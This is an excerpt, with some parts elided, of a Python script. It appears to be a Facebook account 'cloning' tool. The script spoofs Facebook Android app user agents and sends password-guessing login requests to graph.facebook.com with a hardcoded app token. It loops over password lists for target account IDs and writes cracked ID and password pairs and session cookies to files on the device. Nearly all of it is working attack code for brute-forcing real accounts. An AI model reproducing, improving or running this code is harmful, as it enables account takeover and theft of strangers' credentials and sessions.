', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
FBLC = random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"])
def ex():
	ua='[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/'+FBLC+';FBCR/IND airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/'+FBDV+';FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
	#ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; Samsung Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+end
	return ua
...
{R}--------------------------------------------------
{R}❲{G}~{R}❳{G} DEVELOPER {R}:{G} Abdelmalek Eltohami
{R}❲{G}~{R}❳{G} VERSION   {R}:{G} 0.1
{R}--------------------------------------------------""")
##---------------APPROVAL------------##
def approval():
  clear()
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('Github Link').text
    if id in httpCaht:
...
def file():
    ...
    print(f'\r{R}--------------------------------------------------')
    print(f"{R}❲{G}~{R}❳{G} Cloning Has been Completed ")
    print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/THM_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
...
def ind():
                ...
                print(f"{R}❲{G}~{R}❳{G} Cloning Has been Completed ")
                print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/THM_M1_FILE_OK.txt")
                print(f'\r{R}--------------------------------------------------')
                input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                os.system('python Main_MRM.py')
...
def rd1(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/61.0.0.2876;FBBV/6249741;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/IND airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 4i;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
				head = {'User-Agent': ua,'Accept-Encoding':'gzip, deflate','Connection':'close','content-type':'application/json; charset=UTF-8','Host':'graph.facebook.com','x-fb-sim-hni':str(random.randint(2e4,4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'8114af471d039628db5c68cb127af936'}
				...
				if 'session_key' in po:
						...
						break
						if res == 'LOCK':
							print(f'\r\r\33[1;36m[=]~[AKASH-LOCK] {uid} | {pas}')
						break
				elif 'www.facebook.com' in po['error']['message']:
						uid = str(po['error']['error_data']['uid'])
						print('\r\r\x1b[38;5;46m(=)~(THM-OK) '+uid+' | '+pas+'\033[1;97m')
						#print(f'\r\033[1;32[Account Create Date] '+_bristy_(uid)+' \ [Date Of Birth]' +getDOB(cookie)+' '+'\033[1;92m')
						file_path = os.path.join(folder_path, 'THM-CP.txt')
...
def sex():
	...
	ua = f'Dalvik/2.1.0 (Linux; U; Android 13 {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}THM-M1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}❲{G}THM-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'THM-FILE-M1-OK.txt')
                    open('/sdcard/MRM/THM-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}THM-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'THTM-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[=]~[THM-M1]~[%s]~[OK|CP]~[%s|0]\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m[=]~[M1]~[THM-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'THM_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
					print(f'\r\r\33[1m\33[1;35m[=]~[M1]~[THM-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'THM-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
